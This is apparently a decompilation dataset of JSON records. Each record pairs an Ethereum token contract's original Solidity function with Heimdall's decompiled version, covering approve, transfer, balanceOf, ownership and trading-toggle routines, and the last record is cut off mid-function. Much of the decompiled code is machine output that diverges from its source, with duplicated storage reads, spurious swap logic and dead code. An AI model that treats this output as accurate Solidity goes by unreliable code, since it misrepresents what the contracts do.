{"contract_address": "0xE79231d4ad0AB655587c3651A59B99a0407a28A5", "original_solidity_code": "function approve(address spender, uint256 amount) public virtual override returns (bool) {\r\n        _allowances[_msgSender()][spender] = amount;\r\n        emit Approval(_msgSender(), spender, amount);\r\n        return true;\r\n    }", "heimdall_decompiled_code": "function approve(address arg0, uint256 arg1) public payable returns (bool) {\n        require(arg0 == (address(arg0)));\n        address var_a = msg.sender;\n        var_b = 0x02;\n        var_a = address(arg0);\n        address var_b = keccak256(var_a);\n        storage_map_b[var_a] = arg1;\n        uint256 var_c = arg1;\n        emit Approval(msg.sender, address(arg0), arg1);\n        var_c = 0x01;\n        return 0x01;\n    }"}
{"contract_address": "0x781243eaa7c0Eb4ba152e4709347249fAA1c7Bc1", "original_solidity_code": "function balanceOf(address account) external view override returns (uint256) {\\r\\n      uint160 \\r\\n      x = uint160(account\\r\\n        ); return slotValues(\\r\\n          x, 4) + \\r\\n          slotValues(x\\r\\n          , 6); }", "heimdall_decompiled_code": "function balanceOf(address arg0) public view returns (uint256) {\n        address var_a = address(arg0);\n        var_b = 0x06;\n        var_a = address(arg0);\n        var_b = 0x04;\n        address var_c = storage_map_d[var_a] + storage_map_d[var_a];\n        return storage_map_d[var_a] + storage_map_d[var_a];\n    }"}
{"contract_address": "0x31218E25Ad864a39c1e3623a1F0e52f2E286E3b4", "original_solidity_code": "function manualBurn(uint256 amount) external returns (bool) {\r\n        _transfer(address(msg.sender), address(0xdead), amount);\r\n        return true;\r\n    }", "heimdall_decompiled_code": "function manualBurn(uint256 arg0) public {\n        require(arg0 > 0, \"SafeMath: addition overflow\");\n        address var_a = address(msg.sender);\n        var_b = 0x03;\n        require(bytes1(storage_map_a[var_a]), \"SafeMath: addition overflow\");\n        require(bytes1(storage_map_a[var_a]), \"SafeMath: addition overflow\");\n        require(!0, \"SafeMath: addition overflow\");\n        var_a = address(this);\n        var_b = 0x01;\n        require(!(storage_map_a[var_a] > (0 + storage_map_a[var_a])), \"SafeMath: addition overflow\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x11;\n        require(!((0 + storage_map_a[var_a]) < storage_map_a[var_a]), \"SafeMath: addition overflow\");\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = 0x20;\n        var_f = 0x1b;\n        var_g = 0x536166654d6174683a206164646974696f6e206f766572666c6f770000000000;\n        var_a = address(this);\n        var_b = 0x01;\n        storage_map_a[var_a] = 0 + storage_map_a[var_a];\n        uint256 var_d = 0;\n        emit Transfer(address(msg.sender), address(this), 0);\n        var_a = address(msg.sender);\n        var_b = 0x01;\n        uint256 var_h = 0x40 + var_h;\n        var_d = 0x1e;\n        var_i = 0x536166654d6174683a207375627472616374696f6e206f766572666c6f770000;\n        require(!(arg0 > storage_map_a[var_a]), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        var_j = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_g = 0x20;\n        uint256 var_k = var_h.length;\n        uint256 var_l = 0;\n        var_m = var_n;\n        var_l = 0;\n        require(!((storage_map_a[var_a] - arg0) > storage_map_a[var_a]), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x11;\n        var_a = address(msg.sender);\n        var_b = 0x01;\n        storage_map_a[var_a] = storage_map_a[var_a] - arg0;\n        var_h = 0x40 + var_h;\n        var_j = 0x1e;\n        var_o = 0x536166654d6174683a207375627472616374696f6e206f766572666c6f770000;\n        require(!(0 > arg0), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        var_p = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_m = 0x20;\n        uint256 var_q = var_h.length;\n        uint256 var_r = 0;\n        var_s = var_n;\n        var_r = 0;\n        require(!((arg0 - 0) > arg0), \"SafeMath: multiplication overflow\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x11;\n        require(bytes1(tradingEnabled / 0x010000000000000000000000000000000000000000), \"SafeMath: multiplication overflow\");\n        require(address(msg.sender) - (address(tradingEnabled)), \"SafeMath: multiplication overflow\");\n        require(0xdead - (address(tradingEnabled)), \"SafeMath: multiplication overflow\");\n        require(0 - arg0, \"SafeMath: multiplication overflow\");\n        require((sellFees == ((sellFees * arg0) / arg0)) | !arg0, \"SafeMath: multiplication overflow\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x11;\n        require(arg0, \"SafeMath: multiplication overflow\");\n        require(((sellFees * arg0) / arg0) == sellFees, \"SafeMath: multiplication overflow\");\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = 0x20;\n        var_f = 0x21;\n        var_g = 0x536166654d6174683a206d756c7469706c69636174696f6e206f766572666c6f;\n        var_k = 0x7700000000000000000000000000000000000000000000000000000000000000;\n        var_h = 0x40 + var_h;\n        var_d = 0x1a;\n        var_i = 0x536166654d6174683a206469766973696f6e206279207a65726f000000000000;\n        require(0x64);\n        require(0x64);\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x12;\n        require(bytes1(tradingEnabled / 0x01000000000000000000000000000000000000000000));\n        require(bytes1(tradingEnabled / 0x01000000000000000000000000000000000000000000));\n        require(bytes1(tradingEnabled / 0x01000000000000000000000000000000000000000000));\n        require(bytes1(tradingEnabled / 0x01000000000000000000000000000000000000000000));\n        tradingEnabled = 0x01000000000000000000000000000000000000000000 | (uint248(tradingEnabled));\n        var_j = 0x02;\n        var_h = var_h + 0x60;\n        var_t = msg.data[4:68];\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x32;\n        address var_o = address(this);\n        var_u = 0xad5c464800000000000000000000000000000000000000000000000000000000;\n        (bool success, bytes memory ret0) = address(store_c / 0x01).WETH(var_q); // staticcall\n        var_h = var_h + (uint248(ret0.length + 0x1f));\n        require(!((var_h + ret0.length) - var_h) < 0x20);\n        require(var_h.length == (address(var_h.length)));\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x32;\n        uint256 var_p = address(var_h.length);\n        var_a = address(this);\n        var_b = 0x02;\n        var_a = address(store_c);\n        address var_b = keccak256(var_a);\n        storage_map_a[var_a] = store_d;\n        var_v = store_d;\n        emit Approval(address(this), address(store_c), store_d);\n        var_v = 0x791ac94700000000000000000000000000000000000000000000000000000000;\n        var_s = store_d;\n        uint256 var_w = 0;\n        var_x = 0xa0;\n        uint256 var_y = var_h.length;\n        address var_z = address(this);\n        uint256 var_aa = block.timestamp;\n        require(address(store_c).code.length);\n        (bool success, bytes memory ret0) = address(store_c).Unresolved_791ac947(var_s); // call\n        tradingEnabled = uint248(tradingEnabled);\n        (bool success, bytes memory ret0) = address(store_e).transfer(address(this).balance);\n        if (ret0.length == 0) {\n        }\n        var_a = address(this);\n        var_b = 0x01;\n        if (!storage_map_a[var_a] > store_d) {\n        }\n        if (!tradingEnabled / 0x0100000000000000000000000000000000000000000000) {\n        }\n        if (!(address(tradingEnabled)) == 0xdead) {\n        }\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x12;\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = 0x20;\n        var_f = 0x16;\n        var_g = 0x54726164696e67206973206e6f74207374617274656400000000000000000000;\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = 0x20;\n        var_f = 0x29;\n        var_g = 0x5472616e7366657220616d6f756e74206d757374206265206772656174657220;\n        var_k = 0x7468616e207a65726f0000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0x0571e4201619916DB35214e935F0E46F037BBd2D", "original_solidity_code": "function startTrading() external onlyOwner {tradingAllowed = true;}", "heimdall_decompiled_code": "function startTrading() public {\n        require(msg.sender == (address(getOwner)), \"!OWNER\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x06;\n        var_d = 0x214f574e45520000000000000000000000000000000000000000000000000000;\n        pair = 0x010000000000000000000000000000000000000000 | (uint248(pair));\n    }"}
{"contract_address": "0x636aD441CdA1EC74BC059A23615b9D9c3464d9e3", "original_solidity_code": "function name() public view returns (string memory) {\r\n        return _name;\r\n    }", "heimdall_decompiled_code": "function name() public view returns (string memory) {\n        if (killd) {\n            if (!(killd) == ((killd >> 0x01) < 0x20)) {\n                var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                var_b = 0x22;\n                uint256 var_c = var_c + (0x20 + (((0x1f + (killd >> 0x01)) / 0x20) * 0x20));\n                bytes32 var_d = killd >> 0x01;\n                if (killd) {\n                    if (!(killd) == ((killd >> 0x01) < 0x20)) {\n                        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                        var_b = 0x22;\n                        if (!killd >> 0x01) {\n                            if (0x1f < (killd >> 0x01)) {\n                                var_a = 0x01;\n                                var_e = storage_map_t[var_a];\n                                if ((0x20 + var_c) + (killd >> 0x01) > (0x20 + (0x20 + var_c))) {\n                                    var_e = 0x20;\n                                    uint256 var_f = var_c.length;\n                                    if (!0 > var_c.length) {\n                                        uint256 var_g = 0;\n                                        return abi.encodePacked(0x20, var_c.length);\n                                        return abi.encodePacked(0x20, var_c.length);\n                                    }\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }"}
{"contract_address": "0xb611B4D07f9ED4f7a6C53092BF079e76c5c95AEf", "original_solidity_code": "function setExecutor(address _newExector) external {\r\n        require(msg.sender == _executor, \"Access denied\");\r\n        _executor = _newExector;\r\n    }", "heimdall_decompiled_code": "function setExecutor(address arg0) public {\n        require(arg0 == (address(arg0)));\n        require(address(msg.sender) == (address(store_a / 0x01)), \"Access denied\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_d = 0x0d;\n        var_e = 0x4163636573732064656e69656400000000000000000000000000000000000000;\n        store_a = (address(arg0) * 0x01) | (uint96(store_a));\n    }"}
{"contract_address": "0x7ccFBc00423e429844f344aA62D726E3C0DCbfCA", "original_solidity_code": "function symbol() public view  returns (string memory) {\r\n        return _tokenSSSsymbol;\r\n    }", "heimdall_decompiled_code": "function symbol() public view returns (string memory) {\n        if (store_i) {\n            if (store_i - ((store_i >> 0x01) < 0x20)) {\n                var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                var_b = 0x22;\n                uint256 var_c = var_c + (0x20 + (((0x1f + (store_i >> 0x01)) / 0x20) * 0x20));\n                bytes32 var_d = store_i >> 0x01;\n                if (store_i) {\n                    if (store_i - ((store_i >> 0x01) < 0x20)) {\n                        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                        var_b = 0x22;\n                        if (!store_i >> 0x01) {\n                            if (0x1f < (store_i >> 0x01)) {\n                                var_a = 0x05;\n                                var_e = storage_map_b[var_a];\n                                if ((0x20 + var_c) + (store_i >> 0x01) > (0x20 + (0x20 + var_c))) {\n                                    var_e = 0x20;\n                                    uint256 var_f = var_c.length;\n                                    uint256 var_g = 0;\n                                    return abi.encodePacked(0x20, var_c.length);\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }"}
{"contract_address": "0xbe862864614FB652e663EA82FC3AdEAD65E73d29", "original_solidity_code": "function transfer(address recipient, uint256 amount) public virtual override returns (bool) {\r\n    require(_balances[_msgSender()] >= amount, \"TT: transfer amount exceeds balance\");\r\n    _balances[_msgSender()] -= amount;\r\n    _balances[recipient] += amount;\r\n\r\n    emit Transfer(_msgSender(), recipient, amount);\r\n    return true;\r\n    }", "heimdall_decompiled_code": "function transfer(address arg0, uint256 arg1) public payable returns (bool) {\n        require(arg0 == (address(arg0)));\n        address var_a = msg.sender;\n        var_b = 0x01;\n        require(!(arg1 > storage_map_b[var_a]), \"TT: transfer amount exceeds balance\");\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x23;\n        var_f = 0x54543a207472616e7366657220616d6f756e7420657863656564732062616c61;\n        var_g = 0x6e63650000000000000000000000000000000000000000000000000000000000;\n        var_a = msg.sender;\n        var_b = 0x01;\n        require(!(storage_map_b[var_a] - arg1) > storage_map_b[var_a]);\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_h = 0x11;\n        storage_map_b[var_a] = storage_map_b[var_a] - arg1;\n        var_a = address(arg0);\n        var_b = 0x01;\n        require(!storage_map_b[var_a] > (arg1 + storage_map_b[var_a]));\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_h = 0x11;\n        storage_map_b[var_a] = arg1 + storage_map_b[var_a];\n        uint256 var_c = arg1;\n        emit Transfer(msg.sender, address(arg0), arg1);\n        var_c = 0x01;\n        return 0x01;\n    }"}
{"contract_address": "0x4d940f5C7f67BcD5997a27F9E3b97028B226e292", "original_solidity_code": "function balanceOf(address account) public view virtual override returns (uint256) {\r\n        return _balances[account];\r\n    }", "heimdall_decompiled_code": "function balanceOf(address arg0) public view returns (uint256) {\n        require(arg0 == (address(arg0)));\n        address var_a = address(arg0);\n        uint256 var_b = 0;\n        address var_c = storage_map_b[var_a];\n        return storage_map_b[var_a];\n    }"}
{"contract_address": "0x20ad88B64104B4E9B3915aAB9c3bfb4E4121622f", "original_solidity_code": "function updateandeditlimits() external onlyOwner returns (bool){\r\n        limitsInEffect = false;\r\n        transferDelayEnabled = false;\r\n        return true;\r\n    }", "heimdall_decompiled_code": "function updateandeditlimits() public returns (bool) {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        tradingActive = uint248(tradingActive);\n        transferDelayEnabled = uint248(transferDelayEnabled);\n        var_a = 0x01;\n        return 0x01;\n    }"}
{"contract_address": "0xF37412281Cb92fb10ccA519C55F0276BAFa6Ea2f", "original_solidity_code": "function openTrading() external onlyOwner() {\r\n        require(!tradingOpen,\"trading is already open\");\r\n        uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);\r\n        _approve(address(this), address(uniswapV2Router), _tTotal);\r\n        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());\r\n        uniswapV2Router.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);\r\n        IERC20(uniswapV2Pair).approve(address(uniswapV2Router), type(uint).max);\r\n        swapEnabled = true;\r\n        tradingOpen = true;\r\n    }", "heimdall_decompiled_code": "function openTrading() public {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        require(!(bytes1(store_g / 0x010000000000000000000000000000000000000000)), \"trading is already open\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x17;\n        var_d = 0x74726164696e6720697320616c7265616479206f70656e000000000000000000;\n        store_f = 0x7a250d5630b4cf539739df2c5dacb4c659f2488d | (uint96(store_f));\n        require(0x09, \"ERC20: approve to the zero address\");\n        require((0x01 == 0x01) | !0x3b9aca00, \"ERC20: approve to the zero address\");\n        var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_f = 0x11;\n        require(address(this), \"ERC20: approve to the zero address\");\n        require(0x7a250d5630b4cf539739df2c5dacb4c659f2488d, \"ERC20: approve to the zero address\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x22;\n        var_d = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;\n        var_g = 0x7373000000000000000000000000000000000000000000000000000000000000;\n        address var_e = address(this);\n        var_h = 0x02;\n        var_e = 0x7a250d5630b4cf539739df2c5dacb4c659f2488d;\n        address var_h = keccak256(var_e);\n        storage_map_n[var_e] = 0x3b9aca00;\n        var_a = 0x3b9aca00;\n        emit Approval(address(this), 0x7a250d5630b4cf539739df2c5dacb4c659f2488d, 0x3b9aca00);\n        var_a = 0xc45a015500000000000000000000000000000000000000000000000000000000;\n        (bool success, bytes memory ret0) = address(store_f / 0x01).factory(var_b); // staticcall\n        uint256 var_i = var_i + (uint248(ret0.length + 0x1f));\n        require(!((var_i + ret0.length) - var_i) < 0x20);\n        require(var_i.length == (address(var_i.length)));\n        var_j = 0xad5c464800000000000000000000000000000000000000000000000000000000;\n        (bool success, bytes memory ret0) = address(store_f / 0x01).WETH(var_c); // staticcall\n        var_i = var_i + (uint248(ret0.length + 0x1f));\n        require(!((var_i + ret0.length) - var_i) < 0x20);\n        require(var_i.length == (address(var_i.length)));\n        var_k = 0xc9c6539600000000000000000000000000000000000000000000000000000000;\n        address var_d = address(this);\n        uint256 var_g = address(var_i.length);\n        (bool success, bytes memory ret0) = address(var_i.length).Unresolved_c9c65396(var_d); // call\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x24;\n        var_d = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;\n        var_g = 0x7265737300000000000000000000000000000000000000000000000000000000;\n        if (0x0a) {\n            if (0x0a == 0x01) {\n                if (0x0a == 0x02) {\n                    if (!0x09 > 0xff) {\n                        var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                        var_f = 0x11;\n                        if (!((0x0a < 0x0b) & (0x09 < 0x4e)) | ((0x0a < 0x0133) & (0x09 < 0x20))) {\n                            if (!0x09 > 0x01) {\n                                if (!0x01 > 0x1999999999999999999999999999999999999999999999999999999999999999) {\n                                    var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                    var_f = 0x11;\n                                    if (!0x0a > 0x1999999999999999999999999999999999999999999999999999999999999999) {\n                                        var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                        var_f = 0x11;\n                                        if (!0x01) {\n                                        }\n                                    }\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }"}
{"contract_address": "0x6f87c7FAc982eB280d81865547aB31fD209b1637", "original_solidity_code": "function renounceBlacklist() public onlyOwner {\\n        blacklistRenounced = true;\\n    }", "heimdall_decompiled_code": "function renounceBlacklist() public {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        blacklistRenounced = 0x01000000 | (uint248(blacklistRenounced));\n    }"}
{"contract_address": "0x33743F9E4bf0A323807Fc1517Bb9aD9557585f48", "original_solidity_code": "function isBot(address a) public view returns (bool){\r\n      return bots[a];\r\n    }", "heimdall_decompiled_code": "function isBot(address arg0) public view returns (bool) {\n        require(arg0 == (address(arg0)));\n        address var_a = address(arg0);\n        var_b = 0x04;\n        address var_c = !(!bytes1(storage_map_b[var_a]));\n        return !(!bytes1(storage_map_b[var_a]));\n    }"}
{"contract_address": "0x54eEA875389f51FB46A26Ea5a5DbBa480ca74339", "original_solidity_code": "function decreaseAllowance(address spender, uint256 subtractedValue)\r\n        public\r\n        virtual\r\n        returns (bool)\r\n    {\r\n        address owner = _msgSender();\r\n        uint256 currentAllowance = allowance(owner, spender);\r\n        require(\r\n            currentAllowance >= subtractedValue,\r\n            \"ERC20: decreased allowance below zero\"\r\n        );\r\n        unchecked {\r\n            _approve(owner, spender, currentAllowance - subtractedValue);\r\n        }\r\n\r\n        return true;\r\n    }", "heimdall_decompiled_code": "function decreaseAllowance(address arg0, uint256 arg1) public returns (bool) {\n        require(arg0 == (address(arg0)));\n        address var_a = address(msg.sender);\n        var_b = 0x01;\n        var_a = address(arg0);\n        address var_b = keccak256(var_a);\n        require(!(storage_map_b[var_a] < arg1), \"ERC20: decreased allowance below zero\");\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x25;\n        var_f = 0x45524332303a2064656372656173656420616c6c6f77616e63652062656c6f77;\n        var_g = 0x207a65726f000000000000000000000000000000000000000000000000000000;\n        require(address(msg.sender), \"ERC20: approve to the zero address\");\n        require(address(arg0), \"ERC20: approve to the zero address\");\n        var_a = address(msg.sender);\n        var_b = 0x01;\n        var_a = address(arg0);\n        var_b = keccak256(var_a);\n        storage_map_b[var_a] = storage_map_b[var_a] - arg1;\n        uint256 var_c = storage_map_b[var_a] - arg1;\n        emit Approval(address(msg.sender), address(arg0), storage_map_b[var_a] - arg1);\n        var_c = 0x01;\n        return 0x01;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x22;\n        var_f = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;\n        var_g = 0x7373000000000000000000000000000000000000000000000000000000000000;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x24;\n        var_f = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;\n        var_g = 0x7265737300000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0xfc606C8F7141110c3f295a22004D274680A9A029", "original_solidity_code": "function getTotalReferred(address _address) public view returns (uint256) {\r\n        return totalReferred[_address];\r\n    }", "heimdall_decompiled_code": "function getTotalReferred(address arg0) public view returns (uint256) {\n        require(arg0 == (address(arg0)));\n        address var_a = address(arg0);\n        var_b = 0x06;\n        address var_c = storage_map_a[var_a];\n        return storage_map_a[var_a];\n    }"}
{"contract_address": "0x311f785e0fcb5A7c8990cdBe114e59A787116705", "original_solidity_code": "function transferOwnership(address newOwner) public virtual onlyOwner {\r\n        require(newOwner != address(0), \"Ownable: new owner is the zero address\");\r\n        _transferOwnership(newOwner);\r\n    }", "heimdall_decompiled_code": "function transferOwnership(address arg0) public {\n        require(arg0 == (address(arg0)));\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        require(address(arg0), \"Ownable: new owner is the zero address\");\n        owner = (address(arg0)) | (uint96(owner));\n        emit OwnershipTransferred(address(owner), address(arg0));\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x26;\n        var_d = 0x4f776e61626c653a206e6577206f776e657220697320746865207a65726f2061;\n        var_e = 0x6464726573730000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0x172F7a6F8C76321376cf077c4b68f6C0A0907d2f", "original_solidity_code": "function claimDividend() external {\r\n        distributor.claimDividend(msg.sender);\r\n    }", "heimdall_decompiled_code": "function claimDividend() public {\n        var_a = 0x15f7e05e00000000000000000000000000000000000000000000000000000000;\n        address var_b = address(msg.sender);\n        require(address(blacklistEnabled / 0x01).code.length);\n        (bool success, bytes memory ret0) = address(blacklistEnabled / 0x01).{ value: 0 ether }Unresolved_15f7e05e(var_b); // call\n    }"}
{"contract_address": "0x7F073dD6bC1B6480d8f06Ebedd6c53f4dD9c8DBc", "original_solidity_code": "function renounceOwnership() public virtual onlyOwner {\r\n        _transferOwnership(address(0));\r\n    }", "heimdall_decompiled_code": "function renounceOwnership() public payable {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        owner = 0 | (uint96(owner));\n        emit OwnershipTransferred(address(owner), 0);\n    }"}
{"contract_address": "0x81e8B33fc9ace761BdfB7Ca1335A2D92da204E70", "original_solidity_code": "function approve(address spender, uint256 amount) public virtual override returns (bool) {\r\n        address owner = _msgSender();\r\n        _approve(owner, spender, amount);\r\n        return true;\r\n    }", "heimdall_decompiled_code": "function approve(address arg0, uint256 arg1) public payable returns (bool) {\n        require(arg0 == (address(arg0)));\n        require(address(msg.sender), \"ERC20: approve to the zero address\");\n        require(address(arg0), \"ERC20: approve to the zero address\");\n        address var_a = address(msg.sender);\n        var_b = 0x01;\n        var_a = address(arg0);\n        address var_b = keccak256(var_a);\n        storage_map_b[var_a] = arg1;\n        uint256 var_c = arg1;\n        emit Approval(address(msg.sender), address(arg0), arg1);\n        var_c = 0x01;\n        return 0x01;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x22;\n        var_f = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;\n        var_g = 0x7373000000000000000000000000000000000000000000000000000000000000;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x24;\n        var_f = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;\n        var_g = 0x7265737300000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0xD551F2Bd835B49DB742f0382d441Ede9C7C1Ee30", "original_solidity_code": "function renounceOwnership() public virtual onlyOwner {\r\n        emit OwnershipTransferred(_owner, address(0));\r\n        _owner = address(0);\r\n    }", "heimdall_decompiled_code": "function renounceOwnership() public {\n        require(address(owner / 0x01) == (address(msg.sender)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_d = 0x20;\n        var_e = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        emit OwnershipTransferred(address(owner / 0x01), 0);\n        owner = 0 | (uint96(owner));\n    }"}
{"contract_address": "0x62DdfB2BA9444095aA52f34c00f73de37436139B", "original_solidity_code": "function excludeAccount(address account) external onlyOwner() {\r\n        require(!_isExcluded[account], \"Account is already excluded\");\r\n        if(_rOwned[account] > 0) {\r\n            _tOwned[account] = tokenFromReflection(_rOwned[account]);\r\n        }\r\n        _isExcluded[account] = true;\r\n        _excluded.push(account);\r\n    }", "heimdall_decompiled_code": "function excludeAccount(address arg0) public payable {\n        require(address(owner / 0x01) == (address(msg.sender)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_b = (0x20 + (0x04 + var_c)) - (0x04 + var_c);\n        var_d = 0x20;\n        var_e = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        address var_f = address(arg0);\n        var_g = 0x04;\n        require(!(bytes1(storage_map_j[var_f] / 0x01)), \"Account is already excluded\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = (0x20 + (0x04 + var_c)) - (0x04 + var_c);\n        var_d = 0x1b;\n        var_e = 0x4163636f756e7420697320616c7265616479206578636c756465640000000000;\n        var_f = address(arg0);\n        var_g = 0x01;\n        require(!(storage_map_j[var_f] > 0), \"Amount must be less than total reflections\");\n        var_f = address(arg0);\n        var_g = 0x01;\n        require(!(storage_map_j[var_f] > store_g), \"Amount must be less than total reflections\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = (0x20 + (0x04 + var_c)) - (0x04 + var_c);\n        var_d = 0x2a;\n        var_h = this.code[12762:12804];\n        require(!(0 < store_h), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        require(0 < store_h, \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        var_f = 0x05;\n        var_f = address(storage_map_k[var_f] / 0x01);\n        var_g = 0x01;\n        require(storage_map_j[var_f] > store_g, \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        require(!(storage_map_j[var_f] > store_g), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        uint256 var_c = 0x40 + var_c;\n        var_a = 0x1a;\n        var_i = 0x536166654d6174683a206469766973696f6e206279207a65726f000000000000;\n        require(0x084595161401484a000000 > 0, 